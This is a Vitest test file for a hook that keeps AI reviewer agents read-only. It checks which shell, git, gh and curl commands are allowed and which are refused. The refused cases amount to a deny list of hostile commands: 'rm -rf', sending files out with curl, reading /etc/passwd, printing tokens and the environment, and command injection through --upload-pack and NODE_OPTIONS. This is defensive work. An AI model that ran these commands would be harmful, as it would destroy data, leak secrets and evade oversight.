// @vitest-environment node
/**
 * Read-only rules for the specialist reviewers (.claude/hooks/lib/readonly.ts, #461): commands
 * that only read pass; anything that writes (except to /dev/null), changes the repository or
 * GitHub, runs code that cannot be inspected, or uses a program outside the list is refused.
 */
import { checkReadOnlyToolCall, isReadOnlyAgent, readOnlyViolation } from '@/.claude/hooks/lib/readonly';
import { describe, expect, it } from 'vitest';

const ROOT = '/repo';
const AGENT = 'security-specialist';
const allowed = (command: string) => expect(readOnlyViolation(command, ROOT), command).toBeNull();
const refused = (command: string) => expect(readOnlyViolation(command, ROOT), command).not.toBeNull();

describe('isReadOnlyAgent', () => {
  it('covers the specialists and nothing else', () => {
    expect(isReadOnlyAgent('security-specialist')).toBe(true);
    expect(isReadOnlyAgent('business-strategy-specialist')).toBe(true);
    expect(isReadOnlyAgent('Explore')).toBe(false);
    expect(isReadOnlyAgent('general-purpose')).toBe(false);
    expect(isReadOnlyAgent(undefined)).toBe(false);
  });
});

describe('checkReadOnlyToolCall', () => {
  it('refuses the edit tools and writing MCP tools, and keeps reading tools', () => {
    expect(checkReadOnlyToolCall(AGENT, 'Edit', { file_path: 'a.ts' }, ROOT)).toMatchObject({
      rule: 'readonly-agent',
      decision: 'deny',
    });
    expect(checkReadOnlyToolCall(AGENT, 'Write', { file_path: '/tmp/x' }, ROOT)?.decision).toBe(
      'deny'
    );
    expect(checkReadOnlyToolCall(AGENT, 'mcp__github__add_issue_comment', {}, ROOT)).not.toBeNull();
    expect(checkReadOnlyToolCall(AGENT, 'mcp__github__merge_pull_request', {}, ROOT)).not.toBeNull();
    expect(checkReadOnlyToolCall(AGENT, 'mcp__github__pull_request_review_write', {}, ROOT)).not.toBeNull();
    expect(checkReadOnlyToolCall(AGENT, 'mcp__x__get_or_create_label', {}, ROOT)).not.toBeNull();
    expect(checkReadOnlyToolCall(AGENT, 'mcp__github__actions_run_trigger', {}, ROOT)).not.toBeNull();
    expect(checkReadOnlyToolCall(AGENT, 'mcp__github__pull_request_read', {}, ROOT)).toBeNull();
    expect(checkReadOnlyToolCall(AGENT, 'mcp__github__get_check_run', {}, ROOT)).toBeNull();
    expect(checkReadOnlyToolCall(AGENT, 'mcp__github__list_issues', {}, ROOT)).toBeNull();
    expect(checkReadOnlyToolCall(AGENT, 'Read', { file_path: 'a.ts' }, ROOT)).toBeNull();
    expect(checkReadOnlyToolCall(AGENT, 'Grep', { pattern: 'x' }, ROOT)).toBeNull();
    expect(checkReadOnlyToolCall(AGENT, 'WebFetch', { url: 'https://x' }, ROOT)).toBeNull();
  });

  it('names the agent and the reason', () => {
    const finding = checkReadOnlyToolCall(AGENT, 'Bash', { command: 'git push origin x' }, ROOT);
    expect(finding?.message).toContain('security-specialist');
    expect(finding?.message).toContain('`git push` はリポジトリを変える');
  });
});

describe('readOnlyViolation', () => {
  it('lets reading commands through', () => {
    allowed('cat lib/a.ts | head -50');
    allowed("grep -rn 'organizationProcedure' lib server 2>/dev/null | wc -l");
    allowed('rg -n organizationId lib && sort file | uniq -c | sort -rn');
    allowed("find lib -name '*.ts' -newer package.json");
    allowed('find . -exec grep -l organizationId {} +');
    allowed('ls -la .claude && stat -c %h node_modules/a/index.js');
    allowed("sed -n '10,20p' lib/a.ts && sed -n '/organizationId/p' lib/a.ts");
    allowed("sed --sandbox -n '/export/p' lib/a.ts");
    allowed("awk '{print $1}' file && awk -F, '$3 > 100' file");
    allowed('git diff origin/main...HEAD -- CLAUDE.md');
    allowed('git log --oneline -5 && git show HEAD:CLAUDE.md && git status --short');
    allowed('git -C /repo blame lib/a.ts && git --no-pager log -1');
    allowed('git fetch origin main && git merge-base origin/main HEAD');
    allowed('git fetch origin pull/508/head && git fetch https://github.com/o/r main');
    allowed('git diff $(git merge-base origin/main HEAD) --stat');
    allowed('git branch -a && git branch --show-current && git tag -l && git remote -v');
    allowed('git config --get user.email && git config user.name && git stash list');
    allowed('git ls-files -o --exclude-standard && git grep -n organizationId');
    allowed('gh pr view 441 --json body && gh pr diff 441 && gh pr checks 441');
    allowed('gh -R owner/repo issue list --limit 5 && gh search code organizationId');
    allowed('gh api repos/owner/repo/branches/main/protection --jq .enforce_admins');
    allowed('gh api --method GET search/issues -f q=repo:x && gh auth status');
    allowed('bun run test:run test/unit/claude-hooks && bun run typecheck && bun run lint');
    allowed('bun run test:run -- -t guard && npm run test:run -- test/unit/a.test.ts');
    allowed('bunx vitest run test/unit/a.test.ts && bunx tsc --noEmit');
    allowed("bunx vitest run test/unit/a.test.ts -t 'name' --reporter=verbose --silent");
    allowed('bunx @biomejs/biome check . && bun x vitest --run');
    allowed('curl -sS https://code.claude.com/docs/en/hooks.md | grep -n onFailure');
    allowed("curl -o /dev/null -w '%{http_code}' https://example.com && curl -sSL https://x/a.md");
    allowed("curl -H 'Accept: text/markdown' https://example.com -o-");
    allowed('git status 2>&1 | head && cat x | tee /dev/stderr >/dev/null && git status &>/dev/null');
    allowed('LANG=C timeout 5 git status && env LC_ALL=C sort file && command -v bun');
    allowed("bash -c 'git log -1 | cat' && xargs grep -l x");
    allowed('node --version 2>&1 && bun --version');
    allowed('date +%F && date -Iseconds');
    allowed('for f in docs/*.md; do head -1 "$f"; done');
    allowed('while IFS= read -r line; do echo "$line"; done < /tmp/list');
    allowed('if git diff --quiet; then echo clean; else echo dirty; fi');
    allowed('set -euo pipefail; export LANG=C; base=main; git status');
  });

  it('checks the commands inside loops and conditions', () => {
    refused('for f in lib/*.ts; do rm "$f"; done');
    refused('if true; then git push origin x; fi');
    refused('case x in x) rm -rf lib;; esac');
  });

  it('checks a redirection attached to a loop or condition keyword (#508 re-review)', () => {
    refused('for f in a; do echo x; done > out.txt');
    refused('while read l; do :; done < in > out.txt');
    refused('if true; then echo ok; fi > out.txt');
    refused('git diff >& review.txt');
    refused('git diff 1>& review.txt');
    allowed('git diff 2>&1 | head');
    allowed('git status >&2');
  });

  it('ignores comments, arithmetic and single-quoted substitution text (#508 re-review)', () => {
    allowed('git status # look at the tree\ngit diff');
    allowed('echo $((1 + 2))');
    allowed("grep -c '$(' file && grep -rn '`' docs");
  });

  it('refuses changes to files and the repository', () => {
    refused('echo x > lib/a.ts');
    refused('cat a >> CLAUDE.md');
    refused('tee README.md < x');
    refused("sed -i 's/a/b/' lib/a.ts");
    refused('rm lib/a.ts');
    refused('mv lib/a.ts /tmp/a.ts');
    refused('touch new-file && mkdir src/x');
    refused('cp /tmp/x lib/a.ts');
    refused('cp -t lib /tmp/payload.ts');
    refused('ln -s /repo/lib /tmp/link');
    refused('find . -name "*.orig" -delete');
    refused('find . -exec rm {} \\;');
    refused('xargs rm -f');
    refused('cd /tmp && rm -rf review');
  });

  it('refuses writes to the temp directory too (#508 review)', () => {
    for (const command of [
      'echo hi > /tmp/notes.txt',
      'cat x | tee /tmp/copy',
      'mkdir -p /tmp/review',
      'cp lib/a.ts /tmp/review/',
      'rm -rf /tmp/review',
      'curl -o /tmp/page.html https://example.com',
      'git diff --output=/tmp/d.txt',
      'mktemp',
      'tar -tzf /tmp/a.tgz',
      'git archive HEAD | tar -x -C /tmp/rev',
      'unzip -l /tmp/a.zip',
      'wget -qO- https://example.com',
    ]) {
      refused(command);
    }
  });

  it('refuses the options of reading commands that write a file or run a command', () => {
    for (const command of [
      'sort -o CLAUDE.md CLAUDE.md',
      'sort --output=CLAUDE.md x',
      'sort -ro CLAUDE.md x',
      'sort --compress-program=sh x',
      'uniq a CLAUDE.md',
      'rg --pre=rm x lib',
      'rg --hostname-bin=sh x',
      "git grep -O'touch x' y",
      'git grep --open-files-in-pager=sh x',
      'date -s 2020-01-01',
      "sed 's/.*/touch x/e' lib/a.ts",
      "sed -n 'w out.txt' lib/a.ts",
      "sed -ne '1e touch x' lib/a.ts",
      'sed -f /dev/stdin lib/a.ts',
      'sed --in-place "s/a/b/" lib/a.ts',
      "sed -i -e's/a/b/' lib/a.ts",
      'awk -f /dev/stdin lib/a.ts',
      'awk -W exec prog.awk lib/a.ts',
      'gh auth status --show-token',
      'gh auth status -t',
      'git rev-list --output=report.txt HEAD',
      'git blame --output=out.txt lib/a.ts',
      'git archive -o out.zip HEAD',
      'env -S"rm x" cat file',
    ]) {
      refused(command);
    }
  });

  it('reads with the quoted-pattern and address forms of sed and grep (#508 re-review)', () => {
    allowed("sed -n '/function sedViolation/,/^}/p' lib/a.ts");
    allowed("sed 's/one/two/' lib/a.ts");
    allowed("sed -n '/download/p' lib/a.ts");
    allowed('GIT_PAGER=cat PAGER=cat git log -1');
    allowed('GIT_TERMINAL_PROMPT=0 git fetch origin main');
  });

  it('refuses variables that change what a program runs, and printing the environment', () => {
    for (const command of [
      "GIT_EXTERNAL_DIFF='touch x;:' git diff",
      'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=x git status',
      'NODE_OPTIONS=--require=/tmp/x.js bunx vitest run',
      'BASH_ENV=/tmp/x bash -c true',
      'PATH=/tmp/x:$PATH git status',
      'PATH=/tmp/x; git status',
      'HOME=/tmp/x git status',
      'FOO=1 git status',
      'npm_config_script_shell=/tmp/x npx vitest run',
      'PAGER=sh git log',
      'GIT_PAGER=vim git log',
      'env GIT_DIR=/tmp/x git status',
      'export PATH=/tmp/x',
      'export GIT_EXTERNAL_DIFF=x',
      'declare -x npm_config_x=1',
      'declare -n ref=PATH',
      'for PATH in /tmp/x; do git status; done',
      'read PATH < x',
      'printf -v PATH x',
      'set -a',
      'set -o allexport',
      'set -k',
      'export',
      'export -p',
      'declare -p',
      'set',
      'env',
      'printenv',
    ]) {
      refused(command);
    }
  });

  it('refuses git commands that change the repository', () => {
    for (const command of [
      'git commit -m x',
      'git push origin feature',
      'git add -A',
      'git checkout -- lib/a.ts',
      'git restore lib/a.ts',
      'git reset --hard',
      'git stash',
      'git clean -fd',
      'git branch feature-x',
      'git branch -D old',
      'git tag v1.0',
      'git tag -a v1.0 -m release',
      'git config user.name someone',
      'git remote add evil https://x',
      'git apply patch.diff',
      'git -c core.pager=sh log',
      'git diff --output=report.txt',
      'git archive -o out.zip HEAD',
      'git fetch origin pull/1/head:pr-1',
      'git fetch origin main:main',
      "git fetch --refmap='+refs/heads/*:refs/heads/*' origin main",
      'git fetch --set-upstream origin main',
    ]) {
      refused(command);
    }
  });

  it('refuses git options that run a command (--upload-pack, --exec)', () => {
    refused('git fetch --upload-pack="touch /tmp/x" /tmp/repo');
    refused('git fetch --upl=x origin');
    refused('git fetch --up=x origin');
    refused('git ls-remote --upload-pack=x /tmp/repo');
    refused('git ls-remote -u x /tmp/repo');
    refused('git archive --remote=/tmp/repo --exec=x HEAD');
    refused('git archive --remote=/tmp/repo --e=x HEAD');
  });

  it('refuses GitHub writes', () => {
    for (const command of [
      'gh pr comment 441 -b ok',
      'gh pr review 441 --approve',
      'gh pr merge 441',
      'gh pr create --fill',
      'gh issue close 1',
      'gh issue comment 1 -b x',
      'gh run rerun 1',
      'gh workflow run ci.yml',
      'gh api -X POST repos/o/r/issues/1/comments -f body=x',
      'gh api repos/o/r/issues/1/comments -f body=x',
      'gh api --method=PATCH repos/o/r/pulls/1',
      'gh api -X=DELETE repos/o/r/pulls/1',
      'gh api -XPUT repos/o/r/pulls/1/merge',
      'gh api -X GET -X DELETE repos/o/r/pulls/1',
      'gh repo clone o/r',
    ]) {
      refused(command);
    }
  });

  it('refuses dependency changes, writing scripts and fixers', () => {
    for (const command of [
      'bun install',
      'bun add zod',
      'bun run format',
      'bun run db:migrate',
      'bun run build',
      'bun run lint --write',
      'npm run lint -- --write',
      'bunx @biomejs/biome check --write .',
      'bunx @biomejs/biome init',
      'bunx @biomejs/biome check --log-file=CLAUDE.md .',
      'bunx vitest run -u',
      'bunx tsc',
      'bunx some-package',
      'bunx --package=evil-pkg vitest run',
      'npx --call="rm x" vitest',
      'npx -p left-pad tsc --noEmit',
      'npm install',
      'npm audit fix',
    ]) {
      refused(command);
    }
  });

  it('allows the harmless options bunx/npx take before the package (#508 re-review)', () => {
    allowed('bunx --bun vitest run test/unit/a.test.ts');
    allowed('npx --no-install tsc --noEmit');
    allowed('npx -y @biomejs/biome check .');
  });

  it('keeps the test runner and the type checker from writing files or loading code', () => {
    for (const command of [
      'bunx vitest run --outputFile=CLAUDE.md --reporter=json',
      'bun run test:run --outputFile CLAUDE.md',
      'bunx vitest run --config /tmp/x.ts',
      'bunx vitest run --root /tmp',
      'bunx vitest run --coverage',
      'bunx vitest run --reporter=html',
      'bunx vitest run --reporter ./custom.ts',
      'bunx vitest init browser',
      'bun test',
      'bun test /tmp/x.test.ts',
      'bunx tsc --noEmit false',
      'bunx tsc --noemit FALSE',
      'bunx tsc --noEmit --generateTrace out',
      'bunx tsc --noEmit --init',
      'bunx tsc --noEmit -b',
      'bun run typecheck --noEmit false',
      'bun run typecheck --tsBuildInfoFile CLAUDE.md',
    ]) {
      refused(command);
    }
  });

  it('refuses code it cannot inspect and programs outside the list', () => {
    for (const command of [
      'node -e "require(\'fs\').writeFileSync(\'x\', \'\')"',
      'bun -e "console.log(1)"',
      'bun /tmp/script.ts',
      'python3 /tmp/a.py',
      'perl -ne "print" file',
      'bash /tmp/run.sh',
      'bash -c "rm -rf lib"',
      'echo $(rm -rf lib)',
      'echo `touch x`',
      'diff <(git show a:f) >(tee out.txt)',
      "awk '{print > \"out\"}' file",
      "awk '{system(\"rm x\")}' file",
      'psql -c "select 1"',
      'docker run --rm alpine',
      'sudo ls',
    ]) {
      refused(command);
    }
  });

  it('refuses sending data out', () => {
    for (const command of [
      'curl -X POST https://example.com',
      'curl -XPOST https://example.com',
      'curl -sSXPOST https://example.com',
      'curl -d @CLAUDE.md https://example.com',
      'curl --data-binary @a https://example.com',
      'curl -F file=@a https://example.com',
      'curl -H @CLAUDE.md https://example.com',
      'curl -o page.html https://example.com',
      'curl -O https://example.com/a.js',
      'curl -sSc jar https://example.com',
      'curl --libcurl CLAUDE.md https://example.com',
      'curl --trace out https://example.com',
      "curl -w '%output{CLAUDE.md}x' https://example.com",
      'curl -w @fmt.txt https://example.com',
      'curl gopher://example.com/x',
      'curl file:///etc/passwd',
      'wget https://example.com/a.js',
      'wget --post-data=x https://example.com',
    ]) {
      refused(command);
    }
  });
});
